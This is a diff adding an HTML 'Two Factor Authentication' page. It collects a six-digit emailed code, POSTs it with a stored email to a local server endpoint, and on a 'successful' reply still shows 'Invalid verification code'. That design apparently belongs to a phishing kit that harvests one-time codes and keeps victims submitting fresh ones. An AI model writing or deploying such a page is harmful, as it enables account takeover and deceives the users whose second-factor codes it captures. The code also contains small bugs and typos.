@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="./grey-logo.png" type="image/x-icon">
+
+  <title>OTP Verification</title>
+  <style>
+    * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Inter", sans-serif;
+}
+
+body {
+  background-color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  text-align: center;
+  width: 100%;
+  max-width: 420px;
+  padding: 30px 20px;
+}
+
+h2 {
+  font-size: 1.4rem;
+  font-weight: 600;
+  margin-bottom: 8px;
+}
+
+p {
+  color: #555;
+  font-size: 0.9rem;
+  margin-bottom: 25px;
+}
+
+.otp-inputs {
+  display: flex;
+  justify-content: center;
+  gap: 12px;
+  margin-bottom: 20px;
+}
+
+.otp-inputs input {
+  width: 50px;
+  height: 50px;
+  text-align: center;
+  font-size: 1.5rem;
+  border: 1px solid #d1d5db;
+  border-radius: 6px;
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.otp-inputs input:focus {
+  border-color: #2563eb;
+  box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.15);
+}
+
+.resend {
+  display: inline-block;
+  margin-bottom: 35px;
+  color: #2563eb;
+  font-size: 0.9rem;
+  text-decoration: none;
+}
+
+.resend:hover {
+  text-decoration: underline;
+}
+
+button {
+  width: 100%;
+  background-color: #2563eb;
+  color: #fff;
+  border: none;
+  border-radius: 6px;
+  padding: 14px;
+  font-size: 1rem;
+  font-weight: 600;
+  cursor: pointer;
+  margin-top: 3rem;
+  position: relative;
+  overflow: hidden;
+  transition: background 0.3s ease;
+}
+
+button:hover {
+  background-color: #1e4ed8;
+}
+
+.loader {
+  display: none;
+  width: 20px;
+  height: 20px;
+  border: 3px solid #fff;
+  border-top: 3px solid transparent;
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+}
+
+@keyframes spin {
+  to {
+    transform: translate(-50%, -50%) rotate(360deg);
+  }
+}
+
+button.loading .btn-text {
+  visibility: hidden;
+}
+
+button.loading .loader {
+  display: block;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+  .otp-inputs input {
+    width: 45px;
+    height: 45px;
+  }
+
+  .container {
+    padding: 20px 15px;
+  }
+}
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Two Factor Authentication</h2>
+    <h4 style="opacity: 70%; margin-bottom: 1rem;" class="email"></h5>
+    <p>We sent a 6-digit code to your email</p>
+
+    <div class="otp-inputs">
+      <input type="text" maxlength="1" autofocus />
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
+      <input type="text" maxlength="1" />
+    </div>
+    <span style="font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif; color: gray; font-size: smaller;">Code will be resend to yoy if you didn't recieved it in <span class="timer"></span></span>
+<br><br>
+
+    <a href="#" class="resend">Resend code</a><br><br>
+    <span style="font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif; color: red; font-size: smaller;" class="res-msg"></span><br>
+    <button id="continue-btn">
+      <span class="btn-text">Continue</span>
+      <span class="loader"></span>
+    </button>
+  </div>
+
+  <script>
+const inputs = document.querySelectorAll(".otp-inputs input");
+const continueBtn = document.getElementById("continue-btn");
+let show_timer = document.querySelector('.timer')
+ document.querySelector('.email').textContent = localStorage.getItem('email');
+// Auto-focus and move to next field
+let timer = 59
+setInterval(function (params) {
+  if (timer <= 59 ) {
+    timer--;
+  }
+    show_timer.textContent = '0:'+timer;
+    if (timer <= 15) {
+      show_timer.style.color= 'red';
+    }
+    if (timer >15) {
+      show_timer.style.color ='gray'
+    }
+  if (timer == 0) {
+    timer =59
+  }
+  
+ 
+  console.log(timer)
+},1000)
+inputs.forEach((input, index) => {
+  input.addEventListener("input", () => {
+    const value = input.value.replace(/[^0-9]/g, "");
+    input.value = value;
+
+    if (value && index < inputs.length - 1) {
+      inputs[index + 1].focus();
+    }
+
+    // Auto-submit when 4 digits are entered
+    if (index === inputs.length - 1 && value) {
+      continueBtn.focus();
+    }
+  });
+
+  input.addEventListener("keydown", (e) => {
+    if (e.key === "Backspace" && input.value === "" && index > 0) {
+      inputs[index - 1].focus();
+    }
+  });
+});
+
+// Auto-focus first input when page loads
+window.addEventListener("load", () => {
+  inputs[0].focus();
+});
+
+// Loading animation on click
+continueBtn.addEventListener("click", () => {
+  const otp = Array.from(inputs).map((i) => i.value).join("");
+  document.querySelector('.res-msg').textContent = ''
+  if (otp.length < 4) {
+    console.log(otp)
+   document.querySelector('.res-msg').textContent = "Please enter the complete 6-digit code.";
+   inputs[0].focus();
+    return;
+  }
+
+  continueBtn.classList.add("loading");
+  const send_data = {
+    msg: 'otp',
+    email: localStorage.getItem('email'),
+    otp:otp
+  }
+         console.log(send_data)
+    fetch('http://localhost:3100/sendreq',{
+    method: 'POST',
+                credentials:'include',
+               headers: {
+                 'Content-Type': 'application/json',
+                       
+               },
+               body: JSON.stringify(send_data) // Convert the data to a JSON string
+              }
+    ).then(async res =>{
+      const data = await res.json()
+      
+      if (data.msg == 'successful') {
+        console.log(data)
+        setTimeout(() => {
+    continueBtn.classList.remove("loading");
+    // Redirect example: window.location.href = "dashboard.html";
+    document.querySelector('.res-msg').textContent = "Invalid verification code"
+    inputs[5].focus();
+   
+  }, 2000);
+      }
+    }).catch(err =>{console.log(err)})
+      
+
+ 
+});
+
+  </script>
+</body>
+</html>
